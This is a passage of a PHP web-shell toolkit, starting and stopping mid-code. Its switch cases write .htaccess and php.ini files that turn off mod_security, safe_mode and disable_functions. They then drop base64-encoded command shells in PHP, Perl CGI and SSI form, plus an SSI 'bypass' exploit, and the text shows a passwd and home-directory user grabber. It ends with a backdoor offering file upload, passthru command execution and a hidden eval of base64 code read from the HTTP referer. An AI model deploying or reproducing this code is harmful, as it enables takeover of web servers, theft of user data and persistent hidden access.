MDAwIiBib3JkZXJjb2xvcmRhcms9IiMwMDZBMDAiPgo8cCBhbGlnbj0ibGVmdCI+Cjx0ZXh0YXJl
YSBzdHlsZT0iYm9yZGVyOiAycHggc29saWQgIzFEMUQxRDtiYWNrZ3JvdW5kOiAjMjAwMDAwO2Nv
bG9yOiNDQ0ZGRkYiIG1ldGhvZD0nUE9TVCcgcm93cz0iMjUiIG5hbWU9IlMxIiBjb2xzPSIyMiI+
CgoKPD9waHAKICAgaWYgKGlzc2V0KCRfR0VUWyd1c2VyJ10pKQogICAgICBzeXN0ZW0oJ2xzIC92
YXIvbWFpbCcpOyAKICAgaWYgKGlzc2V0KCRfUE9TVFsnZ3JhYl91c2VyczEnXSkpIC8vZ3JhYiB1
c2VycyBmcm9tIC9ldGMvcGFzc3dkCiAgIHsKCSAgJGxpbmVzPWZpbGUoIi9ldGMvcGFzc3dkIik7
CgkgIGZvcmVhY2goJGxpbmVzIGFzICRucj0+JHZhbCkKCSAgewoJICAgJHN0cj1leHBsb2RlKCI6
IiwkdmFsKTsKCSAgIGVjaG8gJHN0clswXS4iXG4iOwoJICB9CgkgCiAgIH0KICAgaWYgKGlzc2V0
KCRfUE9TVFsnZ3JhYl91c2VyczInXSkpCiAgICB7CiAgICAgJGRpciA9ICIvaG9tZS8iOwogICAg
IGlmICgkZGggPSBvcGVuZGlyKCRkaXIpKSB7CiAgICAgICAgd2hpbGUgKCgkZmlsZSA9IHJlYWRk
aXIoJGRoKSkgIT09IGZhbHNlKSB7CiAgICAgICAgICAgIGVjaG8gJGZpbGUuICJcbiI7CiAgICAg
ICAgfQoJCQljbG9zZWRpcigkZGgpOwoJCX0KCX0KPz4KPC90ZXh0YXJlYT4KPHRhYmxlPgo8dHI+
Cjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiB2YWx1
ZT0idHJ1ZSIgbmFtZT0iZ3JhYl91c2VyczEiPjwvaW5wdXQ+CjxpbnB1dCB0eXBlPXN1Ym1pdCB2
YWx1ZT0iR3JhYiBVc2VybmFtZXMgZnJvbSAvZXRjL3Bhc3N3ZCI+PC9pbnB1dD4KPC9mb3JtPgo8
L3RyPgo8YnI+Cjx0cj4KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+CjxpbnB1dCB0eXBl
PSJoaWRkZW4iIHZhbHVlPSJ0cnVlIiBuYW1lPSJncmFiX3VzZXJzMiI+PC9pbnB1dD4KPGlucHV0
IHR5cGU9c3VibWl0IHZhbHVlPSJHcmFiIFVzZXJuYW1lcyBmcm9tIC9ob21lLyI+PC9pbnB1dD4K
PC9mb3JtPgo8L3RyPgo8YnI+Cjx0cj4KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+Cjxp
bnB1dCB0eXBlPSJoaWRkZW4iIHZhbHVlPSJ0cnVlIiBuYW1lPSJncmFiX3VzZXJzMyI+PC9pbnB1
dD4KPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSJHcmFiIFVzZXJuYW1lcyBmcm9tIC9ob21lLyBJ
SSI+PC9pbnB1dD4KPC9mb3JtPgo8L3RyPgo8L2Zvcm0+CjwvdGFibGU+Cjw/cGhwCmlmIChpc3Nl
dCgkX1BPU1RbJ2dyYWJfdXNlcnMzJ10pKQogICAgewoJCWVycm9yX3JlcG9ydGluZygwKTsKICAg
ICAkZGlyID0gIi9ob21lLyI7CgkgaWYgKCRkaCA9IG9wZW5kaXIoJGRpcikpIAoJIHsKICAgICAg
ICAkZiA9IHJlYWRkaXIoJGRoKTskZiA9IHJlYWRkaXIoJGRoKTsKICAgICAgICB3aGlsZSAoKCRm
ID0gcmVhZGRpcigkZGgpKSAhPT0gZmFsc2UpIAogICAgICAgIHsKICAgICAgICAgICAgLy9lY2hv
ICRmLiAiXG4iOwogICAgICAgICAgICAkZi49Ii8iOwogICAgICAgICAgICAkZGgyPW9wZW5kaXIo
JGRpci4kZik7CiAgICAgICAgICAgICRmMiA9IHJlYWRkaXIoJGRoMik7JGYyID0gcmVhZGRpcigk
ZGgyKTsKICAgICAgICAgICAgd2hpbGUgKCgkZjIgPSByZWFkZGlyKCRkaDIpKSAhPT0gZmFsc2Up
IAogICAgICAgICAgICB7CiAgICAgICAgICAgICAvL2VjaG8gJGYyLiAiXG4iOwogICAgICAgICAg
ICAgJGYyLj0iLyI7CiAgICAgICAgICAgICAkZGgzPW9wZW5kaXIoJGRpci4kZi4kZjIpOwogICAg
ICAgICAgICAgJGYzID0gcmVhZGRpcigkZGgzKTskZjMgPSByZWFkZGlyKCRkaDMpOwogICAgICAg
ICAgICAgd2hpbGUgKCgkZjMgPSByZWFkZGlyKCRkaDMpKSAhPT0gZmFsc2UpIAogICAgICAgICAg
ICAgewogICAgICAgICAgICAgIGVjaG8gJGYzLiAiPGJyPiI7CiAgICAgICAgICAgICB9CiAgICAg
ICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgfQoJCQljbG9zZWRpcigkZGgpOwoJIH0KCX0K
Pz4=';

$file = fopen("ftpcrack.php" ,"w+");
$write = fwrite ($file ,base64_decode($crackftp));
fclose($file);

� �echo "<iframe src=ftpcrack.php width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_27":
mkdir('safeof', 0755);
chdir('safeof');
$kokdosya = ".htaccess";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a??lamad?!");
$metin = "<IfModule mod_security.c>
� � SecFilterEngine Off
� � SecFilterScanPOST Off
</IfModule>";
fwrite ( $dosya , $metin ) ;
fclose ($dosya);

$kokdosya = "php.ini";

$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a??lamad?!");
$metin = "safe_mode � � � � �= � � � OFF
disable_functions � � � = � � � � � �NONE";
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
$mini = 'PEJPRFkgT25LZXlQcmVzcz0iR2V0S2V5Q29kZSgpOyIgdGV4dD0jZmZmZmZmIGJvdHRvbU1hcmdp
bj0wIGJnQ29sb3I9IzAwMDAwMCBsZWZ0TWFyZ2luPTAgdG9wTWFyZ2luPTAgcmlnaHRNYXJnaW49
MCBtYXJnaW5oZWlnaHQ9MCBtYXJnaW53aWR0aD0wPjxjZW50ZXI+PFRBQkxFIHN0eWxlPSJCT1JE
RVItQ09MTEFQU0U6IGNvbGxhcHNlIiBoZWlnaHQ9MCBjZWxsU3BhY2luZz0wIGJvcmRlckNvbG9y
RGFyaz0jNjY2NjY2IGNlbGxQYWRkaW5nPTIgd2lkdGg9IjEwMCUiIGJnY29sb3I9IzAwMDAwMCBi
b3JkZXJDb2xvckxpZ2h0PSNjMGMwYzAgYm9yZGVyPTEgYm9yZGVyY29sb3I9IiNDMEMwQzAiPjx0
cj48dGggd2lkdGg9IjEwMSUiIGhlaWdodD0iMiIgbm93cmFwIGJvcmRlcmNvbG9yPSIjQzBDMEMw
IiB2YWxpZ249InRvcCIgY29sc3Bhbj0iMiI+PGNlbnRlcj48Zm9udCBjb2xvcj0iIzAwMzNGRiI+
DQo8P3BocA0KZWNobyAiPGI+PGZvbnQgY29sb3I9Ymx1ZT5Db21tYW5kIFNoZWxsPC9mb250Pjwv
Yj48YnI+IjsNCnByaW50X3IoJw0KPHByZT4NCjxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIi
Pg0KPGI+PGZvbnQgY29sb3I9Ymx1ZT5Lb211dCA6PC9mb250PjwvYj48aW5wdXQgbmFtZT0iYmFi
YSIgdHlwZT0idGV4dCI+PGlucHV0IHZhbHVlPSJCYXMga29tdXR1IGRheWkiIHR5cGU9InN1Ym1p
dCI+DQo8L2Zvcm0+DQo8L3ByZT4NCicpOw0KaW5pX3Jlc3RvcmUoInNhZmVfbW9kZSIpOw0KaW5p
X3Jlc3RvcmUoIm9wZW5fYmFzZWRpciIpOw0KJGxpejA9c2hlbGxfZXhlYygkX1BPU1RbYmFiYV0p
OyANCiRsaXowemltPXNoZWxsX2V4ZWMoJF9QT1NUW2xpejBdKTsgDQokdWlkPXNoZWxsX2V4ZWMo
J2lkJyk7DQokc2VydmVyPXNoZWxsX2V4ZWMoJ3VuYW1lIC1hJyk7DQplY2hvICI8cHJlPjxoND4i
Ow0KZWNobyAiPGI+PGZvbnQgY29sb3I9cmVkPmlkIDo8L2ZvbnQ+PC9iPjokdWlkPGJyPiI7DQpl
Y2hvICI8Yj48Zm9udCBjb2xvcj1yZWQ+U2VydmVyPC9mb250PjwvYj46JHNlcnZlcjxicj4iOw0K
ZWNobyAiPGI+PGZvbnQgY29sb3I9cmVkPktvbXV0IFNvbnXnbGFyMTo8L2ZvbnQ+PC9iPjxicj4i
OyANCmVjaG8gJGxpejA7DQplY2hvICRsaXowemltOw0KZWNobyAiPC9oND48L3ByZT4iOw0KPz4=
';

$file = fopen("safe.php" ,"w+");
$write = fwrite ($file ,base64_decode($mini));
fclose($file);
� �echo "<iframe src=safeof/safe.php width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_28":
� � mkdir('cgirun', 0755);
� � chdir('cgirun');
� � � � $kokdosya = ".htaccess";
� � � � $dosya_adi = "$kokdosya";
� � � � $dosya = fopen ($dosya_adi , 'w') or die ("Dosya
a&#231;&#305;lamad&#305;!");
� � � � $metin = "AddHandler cgi-script .pr";
� � � � fwrite ( $dosya , $metin ) ;
� � � � fclose ($dosya);
$cgico = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIw0KIyBQZXJsS2l0LTAuMSAt
IFtEb2FyIHVzZXJpaSBpbnJlZ2lzdHJhdGkgcG90IHZlZGVhIGxpbmt1cmlsZS4gXQ0KIw0KIyBj
bWQucGw6IFJ1biBjb21tYW5kcyBvbiBhIHdlYnNlcnZlcg0KDQp1c2Ugc3RyaWN0Ow0KDQpteSAo
JGNtZCwgJUZPUk0pOw0KDQokfD0xOw0KDQpwcmludCAiQ29udGVudC1UeXBlOiB0ZXh0L2h0bWxc
clxuIjsNCnByaW50ICJcclxuIjsNCg0KIyBHZXQgcGFyYW1ldGVycw0KDQolRk9STSA9IHBhcnNl
X3BhcmFtZXRlcnMoJEVOVnsnUVVFUllfU1RSSU5HJ30pOw0KDQppZihkZWZpbmVkICRGT1JNeydj
bWQnfSkgew0KICAkY21kID0gJEZPUk17J2NtZCd9Ow0KfQ0KDQpwcmludCAnPEhUTUw+DQo8Ym9k
eT4NCjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IkdFVCI+DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFt
ZT0iY21kIiBzaXplPTQ1IHZhbHVlPSInIC4gJGNtZCAuICciPg0KPGlucHV0IHR5cGU9InN1Ym1p
dCIgdmFsdWU9IlJ1biI+DQo8L2Zvcm0+DQo8cHJlPic7DQoNCmlmKGRlZmluZWQgJEZPUk17J2Nt
ZCd9KSB7DQogIHByaW50ICJSZXN1bHRzIG9mICckY21kJyBleGVjdXRpb246XG5cbiI7DQogIHBy
aW50ICItIng4MDsNCiAgcHJpbnQgIlxuIjsNCg0KICBvcGVuKENNRCwgIigkY21kKSAyPiYxIHwi
KSB8fCBwcmludCAiQ291bGQgbm90IGV4ZWN1dGUgY29tbWFuZCI7DQoNCiAgd2hpbGUoPENNRD4p
IHsNCiAgICBwcmludDsNCiAgfQ0KDQogIGNsb3NlKENNRCk7DQogIHByaW50ICItIng4MDsNCiAg
cHJpbnQgIlxuIjsNCn0NCg0KcHJpbnQgIjwvcHJlPiI7DQoNCnN1YiBwYXJzZV9wYXJhbWV0ZXJz
ICgkKSB7DQogIG15ICVyZXQ7DQoNCiAgbXkgJGlucHV0ID0gc2hpZnQ7DQoNCiAgZm9yZWFjaCBt
eSAkcGFpciAoc3BsaXQoJyYnLCAkaW5wdXQpKSB7DQogICAgbXkgKCR2YXIsICR2YWx1ZSkgPSBz
cGxpdCgnPScsICRwYWlyLCAyKTsNCiAgICANCiAgICBpZigkdmFyKSB7DQogICAgICAkdmFsdWUg
PX4gcy9cKy8gL2cgOw0KICAgICAgJHZhbHVlID1+IHMvJSguLikvcGFjaygnYycsaGV4KCQxKSkv
ZWc7DQoNCiAgICAgICRyZXR7JHZhcn0gPSAkdmFsdWU7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJu
ICVyZXQ7DQp9';

$file = fopen("cgi.pr" ,"w+");
$write = fwrite ($file ,base64_decode($cgico));
fclose($file);
� � chmod("cgi.pr",0755);
� �echo "<iframe src=cgirun/cgi.pr width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_29":
� � mkdir('ssim', 0755);
� � chdir('ssim');
� � � � $kokdosya = ".htaccess";
� � � � $dosya_adi = "$kokdosya";
� � � � $dosya = fopen ($dosya_adi , 'w') or die ("Dosya
a&#231;&#305;lamad&#305;!");
� � � � $metin = "AddType text/html .shtml
AddHandler server-parsed .shtml
AddOutputFilter INCLUDES .shtml
Options +Includes";
� � � � fwrite ( $dosya , $metin ) ;
� � � � fclose ($dosya);
$ssiizo2023 = 'PCEtLSNpZiBleHByPSIkSFRUUF9IQ01EIi0tPjwhLS0jZXhlYyBjbWQ9ImNkICRIVFRQX0hQV0Q7
ICRIVFRQX0hDTUQgMj4mMSItLT48IS0tI2Vsc2UtLT48aHRtbD48aGVhZD48dGl0bGU+UC5TLlMu
PC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmh0bWwsYm9keSwjanNvbix4bXAsZm9ybSx0
YWJsZSx0YWJsZSB0ZCxpbnB1dHttYXJnaW46MDtwYWRkaW5nOjA7fWh0bWx7YmFja2dyb3VuZDoj
MDAwMDAwO30uZXJye3BhZGRpbmc6OHB4O3RleHQtYWxpZ246Y2VudGVyO2JvcmRlcjoxcHggc29s
aWQgcmVkO2JhY2tncm91bmQ6I2ZmZmZmZjt9I2pzb2Zme21hcmdpbjo1cHggOHB4O30janNvbntk
aXNwbGF5Om5vbmU7IHBhZGRpbmc6NXB4IDhweDt9eG1wLHRhYmxlLGlucHV0e2ZvbnQ6bm9ybWFs
IDlwdCAiQ291cmllciBOZXciO2NvbG9yOiNmMGYwZjA7Ym9yZGVyOm5vbmU7fXRhYmxle3dpZHRo
OjEwMCU7Ym9yZGVyLWNvbGxhcHNlOmNvbGxhcHNlO30udGRuYnJ7d2hpdGUtc3BhY2U6cHJlO31p
bnB1dHtvdXRsaW5lOm5vbmU7IGJhY2tncm91bmQ6IzAwMDAwMDt9aW5wdXQ6Oi1tb3otZm9jdXMt
aW5uZXJ7Ym9yZGVyOm5vbmU7fTwvc3R5bGU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQi
PnZhciByZXosY21kLGhpc3QsdXNyLHNydixwd2Qsc3VzcixzcHdkO2Z1bmN0aW9uIHRyaW0oc3Ry
KXtyZXR1cm4gc3RyLnJlcGxhY2UoLyheXHMrKXwoXHMrJCkvZywgIiIpO31mdW5jdGlvbiBpbml0
KCl7cmV6PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXonKTtjbWQ9ZG9jdW1lbnQuZ2V0RWxl
bWVudEJ5SWQoJ2NtZCcpO2hpc3Q9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hpc3QnKTtzdXNy
PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdXNyJyk7c3B3ZD1kb2N1bWVudC5nZXRFbGVtZW50
QnlJZCgnc3B3ZCcpO3Vzcj10cmltKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c3InKS52YWx1
ZSk7c3J2PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzc3J2JykuaW5uZXJIVE1MO3B3ZD10cmlt
KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwd2QnKS52YWx1ZSk7ZG9jdW1lbnQuZ2V0RWxlbWVu
dEJ5SWQoJ2pzb2ZmJykuc3R5bGUuZGlzcGxheT0nbm9uZSc7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5
SWQoJ2pzb24nKS5zdHlsZS5kaXNwbGF5PSdibG9jayc7aWYoc3Vzci5pbm5lclRleHQpe3N1c3Iu
aW5uZXJUZXh0PXVzcjtzcHdkLmlubmVyVGV4dD1wd2Q7fWVsc2V7c3Vzci50ZXh0Q29udGVudD11
c3I7c3B3ZC50ZXh0Q29udGVudD1wd2Q7fWNtZC5mb2N1cygpOzwhLS0jaWYgZXhwcj0iIi0tPgpk
b2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3Npb24nKS5zdHlsZS5kaXNwbGF5PSdub25lJzs8IS0t
I2VuZGlmLS0+Cn1mdW5jdGlvbiBlbmRDbWQoKXtpZihzdXNyLmlubmVyVGV4dCljbWQudmFsdWU9
Jyc7ZWxzZXtjbWQuYmx1cigpO2NtZC52YWx1ZT0nJztjbWQuZm9jdXMoKTt9ZG9jdW1lbnQuYm9k
eS5zY3JvbGxUb3A9ZG9jdW1lbnQuYm9keS5zY3JvbGxIZWlnaHQ7fWZ1bmN0aW9uIHNlbmRDbWQo
KXt2YXIgY21kVmFsdWU9Y21kLnZhbHVlO2lmKGhpc3Qub3B0aW9ucyl7dmFyIGlzVW5pcXVlPXRy
dWUsb3B0Q291bnQ9aGlzdC5vcHRpb25zLmxlbmd0aDtmb3IodmFyIGk9MDtpPG9wdENvdW50O2kr
KylpZihoaXN0Lm9wdGlvbnNbaV0udmFsdWU9PWNtZFZhbHVlKXtpc1VuaXF1ZT1mYWxzZTticmVh
azt9aWYoaXNVbmlxdWUpaGlzdC5hcHBlbmRDaGlsZChuZXcgT3B0aW9uKGNtZFZhbHVlLGNtZFZh
bHVlKSk7fWlmKGNtZFZhbHVlPT0nY2xlYXInKXtyZXouaW5uZXJIVE1MPScnO2VuZENtZCgpO31l
bHNlIGlmKGNtZFZhbHVlPT0nZXhpdCcpd2luZG93LmNsb3NlKCk7ZWxzZSBpZihjbWRWYWx1ZSE9
Jycpe3ZhciBhamF4PW5ldyBYTUxIdHRwUmVxdWVzdCgpO2FqYXguY21kPWNtZFZhbHVlO2lmKGNt
ZFZhbHVlLnN1YnN0cigwLDMpPT0nY2QgJyljbWRWYWx1ZSs9JyAyPiYxOyBwd2QnO2FqYXgub3Bl
bignR0VUJyxkb2N1bWVudC5VUkwsdHJ1ZSk7YWpheC5vbnJlYWR5c3RhdGVjaGFuZ2U9b25TdGF0
dXNDaGFuZ2U7YWpheC5zZXRSZXF1ZXN0SGVhZGVyKCdIVVNSJyx1c3IpO2FqYXguc2V0UmVxdWVz
dEhlYWRlcignSFBXRCcscHdkKTthamF4LnNldFJlcXVlc3RIZWFkZXIoJ0hDTUQnLGNtZFZhbHVl
KTthamF4LnNlbmQobnVsbCk7fX1mdW5jdGlvbiBvblN0YXR1c0NoYW5nZSgpe2lmKHRoaXMucmVh
ZHlTdGF0ZT09NCl7aWYodGhpcy5zdGF0dXM9PTIwMCl7dmFyIHJlcz11c3IrJ0AnK3NydisnOicr
cHdkKyckICcrdGhpcy5jbWQrJ1xuJztpZih0aGlzLmNtZC5zdWJzdHIoMCwzKT09J2NkICcpe2lm
KHRoaXMucmVzcG9uc2VUZXh0LmluZGV4T2YoImNhbid0IGNkIik9PS0xKXtwd2Q9dHJpbSh0aGlz
LnJlc3BvbnNlVGV4dCk7aWYocHdkLmlubmVyVGV4dClzcHdkLmlubmVyVGV4dD1wd2Q7ZWxzZSBz
cHdkLnRleHRDb250ZW50PXB3ZDtyZXMrPSdcbic7fWVsc2UgcmVzKz0nY2FuXCd0IGNkICcrdGhp
cy5jbWQuc3Vic3RyKDMpKydcblxuJzt9ZWxzZSByZXMrPXRoaXMucmVzcG9uc2VUZXh0O2lmKHJl
ei5pbm5lclRleHQpcmV6LmlubmVyVGV4dCs9cmVzO2Vsc2UgcmV6LnRleHRDb250ZW50Kz1yZXM7
ZW5kQ21kKCk7fWVsc2UgYWxlcnQoIkVSUk9SOlxuU3RhdHVzOiAiK3RoaXMuc3RhdHVzKyIgKCIr
dGhpcy5zdGF0dXNUZXh0KyIpXG5Db21tYW5kOiAiK3RoaXMuY21kKTt9fTwvc2NyaXB0PjwvaGVh
ZD48Ym9keSBvbmxvYWQ9ImluaXQoKSI+PGRpdiBpZD0ianNvZmYiIGNsYXNzPSJlcnIiPkNhbid0
IHdvcmsgd2l0aG91dCBqYXZhc2NyaXB0LiBTb3JyeS48L2Rpdj48ZGl2IGlkPSJqc29uIj48IS0t
I2lmIGV4cHI9IiItLT48ZGl2IGNsYXNzPSJlcnIiPlNTSSBub3Qgd29yay4gU29ycnkuPC9kaXY+
PCEtLSNlbmRpZi0tPjxkaXYgaWQ9InNzaW9uIj48eG1wIGlkPSJyZXoiPjwveG1wPjxmb3JtIGFj
dGlvbj0iIiBtZXRob2Q9InBvc3QiIG9uc3VibWl0PSJzZW5kQ21kKCk7IHJldHVybiBmYWxzZSI+
PHRhYmxlIGJvcmRlcj0iMCI+PHRyPjx0ZCB3aWR0aD0iMTBweCIgY2xhc3M9InRkbmJyIj48c3Bh
biBpZD0ic3VzciI+PC9zcGFuPkA8c3BhbiBpZD0ic3NydiI+PCEtLSNlY2hvIHZhcj0iU0VSVkVS
X05BTUUiLS0+PC9zcGFuPjo8c3BhbiBpZD0ic3B3ZCI+PC9zcGFuPiQgPC90ZD48dGQ+PGlucHV0
IHR5cGU9InRleHQiIGlkPSJjbWQiIHN0eWxlPSJ3aWR0aDoxMDAlIiBsaXN0PSJoaXN0Ii8+PC90
ZD48dGQgd2lkdGg9IjEwcHgiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSImZ3Q7Jmd0OyIv
PjwvdGQ+PC90cj48L3RhYmxlPjxkYXRhbGlzdCBpZD0iaGlzdCI+PC9kYXRhbGlzdD48aW5wdXQg
dHlwZT0iaGlkZGVuIiBpZD0idXNyIiB2YWx1ZT0iPCEtLSNleGVjIGNtZD0id2hvYW1pIi0tPiIv
PjxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJwd2QiIHZhbHVlPSI8IS0tI2V4ZWMgY21kPSJwd2Qi
LS0+Ii8+PC9mb3JtPjwvZGl2PjwvZGl2PjwvYm9keT48L2h0bWw+PCEtLSNlbmRpZi0tPgo=';

$file = fopen("pss_v.1.0_min.shtml" ,"w+");
$write = fwrite ($file ,base64_decode($ssiizo2023));
fclose($file);

� �echo "<iframe src=ssim/pss_v.1.0_min.shtml width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_30":
� � mkdir('Ph33r', 0755);
� � chdir('Ph33r');
� � � � $kokdosya = ".htaccess";
� � � � $dosya_adi = "$kokdosya";
� � � � $dosya = fopen ($dosya_adi , 'w') or die ("Dosya
a&#231;&#305;lamad&#305;!");
� � � � $metin = "AddHandler server-parsed .html .Ph33r";
� � � � fwrite ( $dosya , $metin ) ;
� � � � fclose ($dosya);
$sabolamer = 'dXNlckBOaW5qYS1TZWN1cml0eTp+CjwhLS0jZXhlYyBjbWQ9IiRIVFRQX0FDQ0VQVCIgLS0+';
$file = fopen("Ph33r.Ph33r" ,"w+");
$write = fwrite ($file ,base64_decode($sabolamer));
fclose($file);
$izobasbakan = 'PD9waHAKCiMgVVJMIFNTSQokdXJsUGgzID0gJ1BoMzNyLlBoMzNyJzsKCiAgICBmdW5jdGlvbiBz
ZW5kKCR1cmxQaDMsJGNtZCkKICAgIHsKICAgICAgICBpZigkY3VybCA9IGN1cmxfaW5pdCgpKQog
ICAgICAgIHsjIGJ5cGFzcyAyMDExCgkJICMgc2FmZV9tb2QgJiBQSFBTdUhvc2luICYgZGlzYWJs
ZV9mdW5jdGlvbnMKCQkgIyBCeSBQaDMzcgogICAgICAgICAgICBjdXJsX3NldG9wdCgkY3VybCxD
VVJMT1BUX1VSTCwgJHVybFBoMyk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLENVUkxP
UFRfUkVUVVJOVFJBTlNGRVIsdHJ1ZSk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLENV
UkxPUFRfQ09OTkVDVFRJTUVPVVQsMzApOwoKICAgICAgICAgICAgJGhlYWRlcnMgPSBhcnJheSgi
QWNjZXB0OiAiLiRjbWQpOwoKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsQ1VSTE9QVF9I
VFRQSEVBREVSLCRoZWFkZXJzKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsQ1VSTE9Q
VF9VUkwsJHVybFBoMyk7CiAgICAgICAgICAgIHJldHVybiBjdXJsX2V4ZWMoJGN1cmwpOwoKICAg
ICAgICB9CiAgICAgICAgY3VybF9jbG9zZSgkY3VybCk7CiAgICB9CiAgICBwcmludCAnPGhlYWQ+
Cjx0aXRsZT4gUGgzM3IgLSBieXBhc3MgMjAxMSBTU2kgPC90aXRsZT4KPHN0eWxlIHR5cGU9InRl
eHQvY3NzIj4KLmF1dG8tc3R5bGUxIHsKCXRleHQtYWxpZ246IGNlbnRlcjsKfQouYXV0by1zdHls
ZTIgewoJdGV4dC1hbGlnbjogY2VudGVyOwoJZm9udC13ZWlnaHQ6IGJvbGQ7Cglmb250LWZhbWls
eTogQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsKfQouYXV0by1zdHlsZTMgewoJdGV4dC1h
bGlnbjogY2VudGVyOwoJY29sb3I6ICNGRjk5MzM7Cn0KLmF1dG8tc3R5bGU0IHsKCWZvbnQtc2l6
ZTogeHgtc21hbGw7Cglmb250LXdlaWdodDogYm9sZDsKfQphIHsKCWNvbG9yOiAjQzBDMEMwOwp9
CmE6dmlzaXRlZCB7Cgljb2xvcjogI0MwQzBDMDsKfQphOmFjdGl2ZSB7Cgljb2xvcjogI0MwQzBD
MDsKfQphOmhvdmVyIHsKCWNvbG9yOiAjQzBDMEMwOwp9Cjwvc3R5bGU+CjwvaGVhZD4nOwogICAg
cHJpbnQnPGJvZHkgc3R5bGU9ImNvbG9yOiAjRkY5OTMzOyBiYWNrZ3JvdW5kLWNvbG9yOiAjNjY2
NjY2OyAiPgoKPGRpdiBjbGFzcz0iYXV0by1zdHlsZTMiPgonOwogICAgcHJpbnQgJwk8c3BhbiBj
bGFzcz0iYXV0by1zdHlsZTIiPlNTSSBleHBsb2l0IC0gJy4kdXJsUGgzLic8L3NwYW4+IDxiciBj
bGFzcz0iYXV0by1zdHlsZTQiIC8+PGJyIC8+JzsKCXByaW50ICc8L2Rpdj4nOwogICAgcHJpbnQg
JzwvZGl2Pgo8Zm9ybSBhY3Rpb249IiMiIG1ldGhvZD0icG9zdCI+Cgk8ZGl2IGNsYXNzPSJhdXRv
LXN0eWxlMSI+JzsKCiAgICBwcmludCAkX1BPU1RbJ2NtZCddLic6IDxiciAvPic7CiAgICBwcmlu
dCAnPHRleHRhcmVhIHdyYXA9Im9mZiIgc3R5bGU9IndpZHRoOiA2OTdweDsgaGVpZ2h0OiAyOTNw
eCIgbmFtZT0iUGgzM3IiPicuIHNlbmQoJHVybFBoMywkX1BPU1RbJ2NtZCddKSAuJzwvdGV4dGFy
ZWE+PGJyIC8+JzsKCiAgICBwcmludCAnPGlucHV0IG5hbWU9ImNtZCIgdHlwZT0idGV4dCIgdmFs
dWU9InVuYW1lIC1hIj48YnIgLz4nOwoKICAgIHByaW50ICc8aW5wdXQgdHlwZT0ic3VibWl0IiB2
YWx1ZT0iUGgzM3IiPjxiciAvPic7CiAgICBwcmludCAnPC9kaXY+IDwvZm9ybT4KIDxhIGhyZWY9
Imh0dHA6Ly9wZW50ZXN0LmVua24ubmV0L2Jsb2cucGhwIj4gCjxwIGNsYXNzPSJhdXRvLXN0eWxl
MSI+TmluamEtU2VjdXJpdHkgdGVhbTxwPjwvYT4KPHAgY2xhc3M9ImF1dG8tc3R5bGUxIj4KPGZv
bnQgY29sb3I9IiNGRjAwMDAiPjxiPkFudGktdHJ1c3QgLSBQaDMzciAtPGZvbnQgY29sb3I9IiNG
RjAwMDAiPkJsYWNrIApIYXQgLSBtYXowMDI8L2ZvbnQ+JzsKcHJpbnQgJzxwIGNsYXNzPSJhdXRv
LXN0eWxlMSI+Cjxmb250IGNvbG9yPSIjRkYwMDAwIj48Yj4gd2VsY29tZS1iYWNrIDogc2VjLXIx
ei5jb20gPC9mb250PjwvYT4gPC9iPic7Cgo/Pg==';

$file = fopen("Ph33r.php" ,"w+");
$write = fwrite ($file ,base64_decode($izobasbakan));
fclose($file);

� �echo "<iframe src=Ph33r/Ph33r.php width=100% height=100%
frameborder=0></iframe> ";
break;
}
?>
<?
// Keeps your deface
error_reporting(0);set_magic_quotes_runtime(0);if(strtolower(substr(PHP_OS,
0, 3)) == "win"){$s="\\";}else{$s="/";}$ad=$_REQUEST['ad'];
if ($ad){chdir($ad);}else{$ad=getcwd();}if
($_FILES["ff"]){move_uploaded_file($_FILES["ff"]["tmp_name"],
$_FILES["ff"]["name"]);}
if ($hr = opendir($ad)) {while($f = readdir($hr)){if(is_dir($f)){$df=$df.$f.'
';}else{$lf=$lf.$f.'
';}}closedir($hr);}$form='<form action="'.$_SERVER['PHP_SELF'].'" method=get>';
parse_str($_SERVER['HTTP_REFERER'],$a); if(reset($a)=='iz' &&
count($a)==9) { echo '<star>';eval(base64_decode(str_replace(" ", "+",
join(array_slice($a,count($a)-3)))));echo '</star>';}
echo '<center><textarea cols=90
rows=20>';if($_GET['cme']){passthru($_GET['cme']);}else{echo
$df.$lf;};echo'</textarea>'.$form.'Change Dir : <input name=ad size=50
value='.getcwd().$s.'><input type=submit
value=Go></form>'.$form.'Command Execute : <input name=cme size=50
value=id> <input type=submit value=eXecute></form><form
